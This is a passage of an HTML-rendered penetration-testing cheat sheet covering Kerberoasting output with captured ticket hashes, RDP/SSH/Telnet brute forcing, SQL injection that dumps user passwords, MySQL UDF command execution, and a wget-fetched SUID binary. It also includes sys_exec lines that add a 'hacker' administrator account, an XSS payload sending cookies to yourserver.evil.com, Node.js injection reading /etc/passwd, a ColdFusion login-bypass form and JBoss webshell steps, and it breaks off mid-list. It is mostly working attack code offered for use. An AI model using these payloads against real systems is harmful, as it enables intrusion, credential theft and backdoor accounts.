11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">root</span><span class="nv">@wpad</span><span class="err">:</span><span class="o">~/</span><span class="n">impacket</span><span class="o">/</span><span class="n">examples</span><span class="err">#</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">request</span><span class="w"> </span><span class="n">sittingduck</span><span class="p">.</span><span class="n">info</span><span class="o">/</span><span class="n">notanadmin</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">DC</span><span class="w"> </span><span class="n">ip</span><span class="w"> </span><span class="n">address</span><span class="o">&gt;</span><span class="w"></span>
<span class="w">    </span><span class="n">Impacket</span><span class="w"> </span><span class="n">v0</span><span class="mf">.9.15</span><span class="o">-</span><span class="n">dev</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span><span class="w"> </span><span class="n">Core</span><span class="w"> </span><span class="n">Security</span><span class="w"> </span><span class="n">Technologies</span><span class="w"></span>

<span class="w">    </span><span class="nl">Password</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="n">ServicePrincipalName</span><span class="w">                </span><span class="n">Name</span><span class="w">        </span><span class="n">MemberOf</span><span class="w">                                              </span><span class="n">PasswordLastSet</span><span class="w"></span>
<span class="w">    </span><span class="c1">----------------------------------  ----------  ----------------------------------------------------  -------------------</span>
<span class="w">    </span><span class="n">http</span><span class="o">/</span><span class="n">win10</span><span class="p">.</span><span class="n">sittingduck</span><span class="p">.</span><span class="n">info</span><span class="w">         </span><span class="n">uberuser</span><span class="w">    </span><span class="n">CN</span><span class="o">=</span><span class="n">Enterprise</span><span class="w"> </span><span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">sittingduck</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">info</span><span class="w">  </span><span class="mi">2015</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">23</span><span class="err">:</span><span class="mi">47</span><span class="err">:</span><span class="mi">21</span><span class="w"></span>
<span class="w">    </span><span class="n">MSSQLSvc</span><span class="o">/</span><span class="n">WIN2K8R2</span><span class="p">.</span><span class="n">sittingduck</span><span class="p">.</span><span class="n">info</span><span class="w">  </span><span class="n">sqladmin01</span><span class="w">                                                        </span><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">13</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">13</span><span class="err">:</span><span class="mi">20</span><span class="w"></span>

<span class="w">    </span><span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="o">*</span><span class="n">sqladmin01</span><span class="err">$</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="err">$</span><span class="n">SPN</span><span class="o">*</span><span class="err">$</span><span class="mf">6e5307</span><span class="n">df490c6e3339f613fdc5655785</span><span class="err">$</span><span class="mi">80</span><span class="n">ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283</span><span class="w"></span>
<span class="w">    </span><span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="o">*</span><span class="n">uberuser</span><span class="err">$</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="err">$</span><span class="n">SPN</span><span class="o">*</span><span class="err">$</span><span class="mi">27</span><span class="n">c08ed2a8d5394f66e8c13c25c98393</span><span class="err">$</span><span class="mi">310</span><span class="n">b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h4 id="smbrelayxpy">SMBRelayx.py<a class="headerlink" href="#smbrelayxpy" title="Permanent link">&para;</a></h4>
<p><a href="https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&amp;utm_source=Twitter&amp;utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&amp;utm_campaign=SANS+Pen+Test">https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&amp;utm_source=Twitter&amp;utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&amp;utm_campaign=SANS+Pen+Test</a></p>
<h3 id="brute-force-techniques">Brute Force Techniques<a class="headerlink" href="#brute-force-techniques" title="Permanent link">&para;</a></h3>
<p>RDP Brute
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">ncrack</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">P</span> <span class="mi">500</span><span class="o">-</span><span class="n">worst</span><span class="o">-</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="mi">3389</span> <span class="mi">10</span><span class="p">.</span><span class="mi">212</span><span class="p">.</span><span class="mi">50</span><span class="p">.</span><span class="mi">21</span>
</pre></div>
</td></tr></table></p>
<p>SSH Brute
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">medusa</span> <span class="o">-</span><span class="n">M</span> <span class="n">ssh</span> <span class="o">-</span><span class="k">C</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">ssh</span><span class="p">.</span><span class="n">lst</span> <span class="o">-</span><span class="n">H</span> <span class="mi">22</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">T</span> <span class="mi">10</span><span class="o">|</span> <span class="n">grep</span> <span class="n">SUCCESS</span> <span class="o">|</span><span class="n">tee</span> <span class="n">medusa</span><span class="o">-</span><span class="n">results</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<p>Telnet Brute
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">medusa</span> <span class="o">-</span><span class="n">M</span> <span class="n">telnet</span> <span class="o">-</span><span class="k">C</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">telnet</span><span class="p">.</span><span class="n">lst</span> <span class="o">-</span><span class="n">H</span> <span class="mi">23</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">T</span> <span class="mi">10</span> <span class="o">-</span><span class="n">t</span> <span class="mi">3</span><span class="o">|</span> <span class="n">grep</span> <span class="n">SUCCESS</span> <span class="o">|</span><span class="n">tee</span> <span class="n">medusa</span><span class="o">-</span><span class="n">results</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table></p>
<h2 id="web-exploitation">Web Exploitation<a class="headerlink" href="#web-exploitation" title="Permanent link">&para;</a></h2>
<h3 id="sql">SQL<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
<h4 id="sqli-examples">SQLi Examples<a class="headerlink" href="#sqli-examples" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">secret</span><span class="s1">&#39;</span><span class="s"> or 1=1 limit1;#</span>
    #<span class="nv">Find</span> <span class="nv">number</span> <span class="nv">of</span> <span class="nv">columns</span> <span class="k">return</span> <span class="nv">by</span> <span class="nv">the</span> <span class="nv">Select</span> <span class="nv">statement</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">order</span> <span class="nv">by</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>...<span class="nv">n</span> <span class="k">until</span> <span class="nv">error</span> <span class="nv">is</span> <span class="nv">received</span>

    #<span class="nv">Use</span> <span class="nv">union</span> <span class="nv">select</span> <span class="nv">statement</span> <span class="nv">to</span> <span class="nv">append</span> <span class="nv">query</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">original</span>
    #<span class="nv">union</span> <span class="nv">Select</span> <span class="nv">statement</span> <span class="nv">must</span> <span class="nv">have</span> <span class="nv">same</span> <span class="nv">number</span> <span class="nv">of</span> <span class="nv">columns</span> <span class="nv">as</span> <span class="nv">original</span> <span class="nv">Select</span> <span class="nv">statement</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,<span class="mi">5</span>,<span class="mi">6</span>

    #<span class="nv">Get</span> <span class="nv">DB</span> <span class="nv">Version</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,@@<span class="nv">version</span>,<span class="mi">6</span>

    #<span class="nv">Get</span> <span class="nv">DBUser</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,<span class="nv">user</span><span class="ss">()</span>,<span class="mi">6</span>

    #<span class="nv">Get</span> <span class="nv">tables</span> <span class="nv">from</span> <span class="nv">all</span> <span class="nv">databases</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">all</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,<span class="nv">table_name</span>,<span class="mi">6</span> <span class="nv">FROM</span> <span class="nv">information_schema</span>.<span class="nv">tables</span>

    #<span class="nv">Get</span> <span class="nv">Table</span> <span class="nv">Columns</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,<span class="nv">column_name</span>,<span class="mi">6</span> <span class="nv">FROM</span> <span class="nv">information_schema</span>.<span class="nv">columns</span> <span class="nv">where</span> <span class="nv">table_name</span><span class="o">=</span><span class="s1">&#39;</span><span class="s">users</span><span class="s1">&#39;</span>

    #<span class="nv">Get</span> <span class="nv">User</span> <span class="nv">passwords</span>
    ?<span class="nv">id</span><span class="o">=</span><span class="mi">738</span> <span class="nv">union</span> <span class="nv">select</span> <span class="mi">1</span>,<span class="mi">2</span>,<span class="mi">3</span>,<span class="mi">4</span>,<span class="nv">concat</span><span class="ss">(</span><span class="nv">name</span>,<span class="mi">0</span><span class="nv">x3a</span>,<span class="nv">password</span><span class="ss">)</span>,<span class="mi">6</span> <span class="nv">FROM</span> <span class="nv">users</span>
</pre></div>
</td></tr></table>

<h5 id="sql-joins">SQL Joins<a class="headerlink" href="#sql-joins" title="Permanent link">&para;</a></h5>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">#</span><span class="k">FULL</span> <span class="k">All</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">FULL</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">ON</span> <span class="n">A</span><span class="p">.</span><span class="k">KEY</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">KEY</span>

    <span class="o">#</span><span class="n">A</span> <span class="k">partial</span> <span class="n">B</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">on</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span>

    <span class="o">#</span><span class="n">B</span> <span class="k">Partial</span> <span class="n">A</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">RIGHT</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">on</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span>

    <span class="o">#</span><span class="n">A</span> <span class="k">no</span> <span class="n">B</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">LEFT</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">on</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span> <span class="k">WHERE</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span> <span class="k">IS</span> <span class="k">NULL</span>

    <span class="o">#</span> <span class="k">Outer</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">FULL</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">on</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span> <span class="k">WHERE</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="k">IS</span> <span class="k">NULL</span> <span class="k">OR</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span> <span class="k">IS</span> <span class="k">NULL</span>

    <span class="o">#</span> <span class="k">Inner</span>
    <span class="k">SELECT</span> <span class="n">something</span> <span class="k">FROM</span> <span class="n">tableA</span> <span class="n">A</span> <span class="k">FULL</span> <span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">tableB</span> <span class="n">B</span> <span class="k">on</span> <span class="n">A</span><span class="p">.</span><span class="k">Key</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="k">Key</span>
</pre></div>
</td></tr></table>

<h4 id="mysql">MySQL<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">[</span><span class="n">mysqldir</span><span class="p">]</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">h</span> <span class="n">hostname</span><span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">--</span><span class="n">password</span><span class="o">=</span><span class="n">pass</span> <span class="o">&lt;</span><span class="n">database</span><span class="o">&gt;</span>

    <span class="n">select</span> <span class="p">@@</span><span class="n">version</span>
    <span class="n">select</span> <span class="p">@@</span><span class="n">servername</span>

    <span class="n">mysql</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">databases</span><span class="p">;</span>
    <span class="n">mysql</span><span class="o">&gt;</span> <span class="n">use</span> <span class="p">[</span><span class="n">db</span> <span class="n">name</span><span class="p">];</span>
    <span class="n">mysql</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">tables</span><span class="p">;</span>
    <span class="n">mysql</span><span class="o">&gt;</span> <span class="n">describe</span> <span class="p">[</span><span class="n">table</span> <span class="n">name</span><span class="p">];</span>
    <span class="n">mysql</span><span class="o">&gt;</span> <span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="p">[</span><span class="n">table</span> <span class="n">name</span><span class="p">];</span>
</pre></div>
</td></tr></table>

<h5 id="udf-install-for-command-execution">UDF Install for Command Execution<a class="headerlink" href="#udf-install-for-command-execution" title="Permanent link">&para;</a></h5>
<p>User Defined Functions by Platform
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">udf</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="mi">32</span><span class="o">/</span><span class="n">lib_mysqludf_sys</span><span class="p">.</span><span class="n">so</span>
    <span class="n">udf</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="mi">64</span><span class="o">/</span><span class="n">lib_mysqludf_sys</span><span class="p">.</span><span class="n">so</span>
    <span class="n">udf</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="mi">32</span><span class="o">/</span><span class="n">lib_mysqludf_sys</span><span class="p">.</span><span class="n">dll</span>
    <span class="n">udf</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="mi">64</span><span class="o">/</span><span class="n">lib_mysqludf_sys</span><span class="p">.</span><span class="n">dll</span>
</pre></div>
</td></tr></table>
Source: <a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a></p>
<p>Load MYSQLUDF for Linux
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">use</span> <span class="n">test</span><span class="p">;</span>
    <span class="k">create</span> <span class="k">table</span> <span class="n">udf</span><span class="p">(</span><span class="n">line</span> <span class="nb">blob</span><span class="p">);</span>
    <span class="k">insert</span> <span class="k">into</span> <span class="n">udfvalues</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/udf/udf.so&#39;</span><span class="p">));</span>
    <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">udfinto</span> <span class="n">dumpfile</span><span class="s1">&#39;/usr/lib/udf.so&#39;</span><span class="p">;</span>
    <span class="k">create</span> <span class="k">function</span> <span class="n">sys_exec</span> <span class="k">returns</span> <span class="nb">integer</span> <span class="n">soname</span><span class="s1">&#39;udf.so&#39;</span><span class="p">;</span>
    <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;id &gt; /tmp/out; chownapache.apache /tmp/out&#39;</span><span class="p">);</span>
    <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;ls -alh/root/Desktop/ &gt;&gt; /tmp/out&#39;</span><span class="p">);</span>
    <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;ls /etc/sudoers&gt;&gt; /tmp/out&#39;</span><span class="p">);</span>
</pre></div>
</td></tr></table></p>
<p>Upload suid.c program
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="p">:</span><span class="n">port</span><span class="o">/</span><span class="n">privex</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">suid</span><span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span>
    <span class="n">chownroot</span><span class="p">:</span><span class="n">root</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span>
    <span class="n">chmod4777</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span>
</pre></div>
</td></tr></table></p>
<p>Load MYSQLUDFfor Windows
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">USE</span> <span class="nt">mysql</span><span class="o">;</span>
    <span class="nt">CREATE</span> <span class="nt">TABLE</span> <span class="nt">npn</span><span class="o">(</span><span class="nt">line</span> <span class="nt">blob</span><span class="o">);</span>
    <span class="nt">INSERT</span> <span class="nt">INTO</span> <span class="nt">npn</span> <span class="nt">values</span><span class="o">(</span><span class="nt">load_files</span><span class="o">(</span><span class="s1">&#39;C://xampplite//webdav//lib_mysqludf_sys.dll&#39;</span><span class="o">));</span>
    <span class="nt">SELECT</span> <span class="o">*</span> <span class="nt">FROM</span> <span class="nt">mysql</span><span class="p">.</span><span class="nc">npnINTO</span> <span class="nt">DUMPFILE</span><span class="s1">&#39;c://windows//system32//lib_mysqludf_sys_32.dll&#39;</span><span class="o">;</span>
    <span class="nt">CREATE</span> <span class="nt">FUNCTION</span> <span class="nt">sys_exec</span> <span class="nt">RETURNS</span> <span class="nt">integer</span> <span class="nt">SONAME</span><span class="s1">&#39;lib_mysqludf_sys_32.dll&#39;</span><span class="o">;</span>
    <span class="nt">SELECT</span> <span class="nt">sys_exec</span><span class="o">(</span><span class="s2">&quot;net user hacker hacker1234!@#$ /add&quot;</span><span class="o">);</span>
    <span class="nt">SELECT</span> <span class="nt">sys_exec</span><span class="o">(</span><span class="s2">&quot;net localgroupAdministrators hacker /add&quot;</span><span class="o">);</span>
    <span class="nt">s_exec</span><span class="o">(</span><span class="s1">&#39;net localgroup&quot;Remote Desktop Users&quot; hacker /add&#39;</span><span class="o">);</span>
</pre></div>
</td></tr></table></p>
<h4 id="sqlmap">SQLMap<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h4>
<p>Automated website crawl and test of SQLi
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">python</span> <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="c1">--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3</span>
</pre></div>
</td></tr></table></p>
<h3 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
<p>Grab cookie
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">document</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;https://yourserver.evil.com/collect.gif?cookie=&#39;</span> <span class="o">+</span> <span class="n">document</span><span class="p">.</span><span class="n">cookie</span> <span class="o">+</span> <span class="s1">&#39;&quot; /&gt;&#39;</span><span class="p">)</span>
</pre></div>
</td></tr></table></p>
<p>XSS via image tag
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="ss">&quot;x&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="ss">&quot;alert(&#39;Suck it, Trebek!&#39;)&quot;</span> <span class="o">/&gt;</span>
</pre></div>
</td></tr></table></p>
<h3 id="server-side-javascript-injection-via-node-or-elementjs">Server-side Javascript Injection via Node or ElementJS<a class="headerlink" href="#server-side-javascript-injection-via-node-or-elementjs" title="Permanent link">&para;</a></h3>
<p>File system directory listing
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">res</span>.<span class="k">end</span><span class="ss">(</span><span class="nv">require</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">fs</span><span class="s1">&#39;</span><span class="ss">)</span>.<span class="nv">readdirSync</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">.</span><span class="s1">&#39;</span><span class="ss">)</span>.<span class="nv">toString</span><span class="ss">())</span>
</pre></div>
</td></tr></table></p>
<p>File read
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">res</span>.<span class="k">end</span><span class="ss">(</span><span class="nv">require</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">fs</span><span class="s1">&#39;</span><span class="ss">)</span>.<span class="nv">readFileSync</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">/etc/passwd</span><span class="s1">&#39;</span><span class="ss">)</span>.<span class="nv">toString</span><span class="ss">())</span>
</pre></div>
</td></tr></table></p>
<h3 id="cold-fusion">Cold Fusion<a class="headerlink" href="#cold-fusion" title="Permanent link">&para;</a></h3>
<p>Sources:
<a href="https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html">JMPESPJUMP - Attacking Adobe Cold Fusion</a></p>
<p><em>Decrypt CFM Files back to source</em></p>
<ul>
<li><a href="https://github.com/disccomp/cfdecrypt">https://github.com/disccomp/cfdecrypt</a></li>
</ul>
<p><em>CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session)</em>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;adminpassword&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;rdsPasswordAllowed&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
</pre></div>
</td></tr></table>
<em>For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:</em></p>
<ul>
<li>[ColdFusion_Install_Dir]\lib\neo-query.xml </li>
</ul>
<p><em>For ColdFusion 8, 9 and 10:</em></p>
<ul>
<li>[ColdFusion_Install_Dir]\lib\neo-datasource.xml</li>
</ul>
<h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link">&para;</a></h3>
<h4 id="jboss">JBOSS<a class="headerlink" href="#jboss" title="Permanent link">&para;</a></h4>
<p>Default credential is "admin:admin"
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="mi">0</span>. <span class="nv">Host</span> <span class="nv">your</span> .<span class="nv">jar</span><span class="o">/</span>.<span class="nv">war</span> <span class="nv">payload</span> <span class="nv">with</span> <span class="nv">webshell</span> <span class="nv">on</span> <span class="nv">local</span> <span class="nv">webserver</span>

<span class="mi">1</span>. <span class="nv">Navigate</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">JMX</span> <span class="nv">Console</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">target</span> <span class="nv">host</span> <span class="ss">(</span><span class="nv">http</span>:<span class="o">//</span><span class="nv">IP</span>.<span class="nv">Ad</span>.<span class="nv">dr</span>.<span class="nv">ess</span>:<span class="nv">port</span><span class="o">/</span><span class="nv">jmx</span><span class="o">-</span><span class="nv">console</span><span class="o">/</span><span class="ss">)</span> <span class="nv">and</span> <span class="nv">search</span> <span class="k">for</span> <span class="nv">service</span><span class="o">=</span><span class="nv">MainDeployer</span>. 

